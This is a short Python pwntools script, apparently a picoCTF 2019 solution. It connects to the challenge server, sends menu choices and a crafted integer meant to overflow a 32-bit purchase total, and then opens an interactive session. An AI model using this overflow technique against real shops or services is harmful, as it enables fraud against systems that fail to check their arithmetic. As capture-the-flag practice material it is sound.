#!/usr/bin/python

from pwn import *

port = raw_input("Enter the port from the prompt: ")
sh = remote('2019shell1.picoctf.com', port)
magic = int(((1<<31)//900)*1.5)
sh.sendline('2')
sh.sendline('1')
sh.sendline(str(magic))
sh.sendline('2')
sh.sendline('2')
sh.sendline('1')
sh.interactive()
